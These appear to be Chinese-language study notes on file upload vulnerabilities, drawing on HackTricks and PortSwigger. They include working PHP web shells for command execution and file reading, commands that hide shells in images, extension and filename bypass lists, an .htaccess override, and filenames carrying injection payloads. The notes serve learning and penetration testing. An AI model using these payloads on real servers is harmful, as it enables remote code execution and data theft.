---
title:File Upload Vulnerability

---

文件上傳漏洞是指用戶上傳可能會造成危害的檔案(~~廢話~~  

## 伺服器如何處理靜態檔案的Request

### 檔案路徑

傳統的網站會把檔案的request，1:1的映射到自己的檔案路徑，如：  
```
GET /files/avatars/profile.png HTTP/1.1
```  
`profile.png` 的絕對位置可能為`/var/www/html/files/avatars/profile.png`  

### 回傳的檔案內容

- 如果檔案類型為`non-executable`：伺服器會回傳檔案的內容  
- 如果檔案類型為`excutable`：伺服器會把request的header和parameter指派給對應的變數，並回傳執行的結果輸出  
- 如果檔案類型為`excutable`，但伺服器沒有設定要執行：大部分情況下會回傳error，但少部分情況會回傳檔案內容回來  

## Web Shell

如果使用者可以執行上傳的檔案，那麼這些檔案內容會造成危害  

### 任意讀取檔案

```php 
<?php echo file_get_contents('/path/to/target/file'); ?>
```

### 執行指令

```php 
<?php system($_GET['cmd']); ?>
```

用這樣的方式可以傳遞parameter給web shell：  
```
GET /example.com/exploit.php?command=id HTTP/1.1
```


## Bypassing

### Content-Type
若是伺服器使用Content-Type驗證檔案
```
POST /images HTTP/1.1
Host: example.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456

Content-Disposition: form-data; name="image"; filename="exploit.php"
Content-Type: image/png
<?php system($_GET['cmd']); ?>

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"
user

---------------------------012345678901234567890123456-- 
```

將`Content-Type`改成`image/png`或[其他](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)

### magic number

伺服器驗證檔案的header  
利用exiftool:  
```
exiftool -Comment="<?php system($_GET['cmd']); ?>" img.jpg
```  

利用linux:  
```
echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
```

### 副檔名驗證
如果遇到副檔名被擋的情況

#### 使用其他副檔名  

以下副檔名之檔案為`executable`
- PHP: `.php`, `.php2`, `.php3`, `.php4`, `.php5`, `.php6`, `.php7`, `.phps`, `.phps`, `.pht`, `.phtm`, `.phtml`, `.pgif`, `.shtml`, `.htaccess`, `.phar`, `.inc`, `.hphp`, `.ctp`, `.module`
- Working in PHPv8: `.php`, `.php4`, `.php5`, `.phtml`, `.module`, `.inc`, `.hphp`, `.ctp`
- ASP: `.asp`, `.aspx`, `.config`, `.ashx`, `.asmx`, `.aspq`, `.axd`, `.cshtm`, `.cshtml`, `.rem`, `.soap`, `.vbhtm`, `.vbhtml`, `.asa`, `.cer`, `.shtml`
- Jsp: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do`, `.action`
- Coldfusion: `.cfm`, `.cfml`, `.cfc`, `.dbm`
- Flash: `.swf`
- Perl: `.pl`, `.cgi`
- Erlang Yaws Web Server: `.yaws`

#### 更改大小寫  

`exploit.pHP`

#### 在增加更多副檔名層級

`exploit.png.php`
`exploit.php.png`
`exploit.php%00.png%00.jpg`

#### 副檔名尾端加入特殊字元

- `exploit.php%20`
- `exploit.php%0a`
- `exploit.php%00`
- `exploit.php%0d%0a`
- `exploit.php/`
- `exploit.php.\`
- `exploit.`
- `exploit.php....`
- `exploit.pHp5....`

#### 混淆副檔名parser

使用多個副檔名、特殊字元和填充多個null byte混淆副檔名parser
- `exploit.png.php`
- `exploit.png.pHp5`
- `exploit.php#.png`
- `exploit.php%00.png`
- `exploit.php\x00.png`
- `exploit.php%0a.png`
- `exploit.php%0d%0a.png`
- `exploit.phpJunk123png`

#### 突破檔案名稱長度上限

`python -c 'print "A" * 232'` + `.php.jpg`

#### 繞過反繞過

`exploit.p.phphp`


## Overriding The Server Configuration

### Apache

1. 檢查`/etc/apache2/apache2.conf(或httpd.conf)`，確保server有允許使用.htaccess:
```
<Directory /path/to/your/directory>
    AllowOverride All
</Directory>
```

2. 上傳`.htaccess`於目前資料夾:  
```AddType application/x-httpd-php evil```

3. 上傳`expoilt.evil`，理論上會被當作php執行


## Filename Tricks

### path travelsal

伺服器解析後檔案可能上傳於上層目錄  
`..%2Fexploit.php`

### SQL injection

此payload可以暫停延遲10秒的sql  
`sleep(10)-- -.jpg`

### command injection

`; sleep 10;`

### XSS

`<svg onload=alert(1)>`


## Reference

- [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [Port Swigger](https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/i)